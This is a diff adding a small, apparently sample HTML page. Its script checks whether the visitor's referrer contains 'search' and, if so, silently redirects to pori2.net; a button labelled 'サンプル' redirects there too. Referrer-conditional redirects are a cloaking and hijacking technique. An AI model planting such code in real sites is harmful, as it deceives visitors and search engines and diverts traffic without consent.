@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+	<script>
+		function goTop() {
+			location.replace("http://pori2.net/");
+		}
+		var str = document.referrer;
+		var sflg = str.indexOf("search", 0);
+		if (sflg != -1)
+			location.replace("http://pori2.net")
+	</script>
+	<form>
+		<input type="button" value="サンプル" onclick="goTop()">
+	</form>
+</body>
+</html>
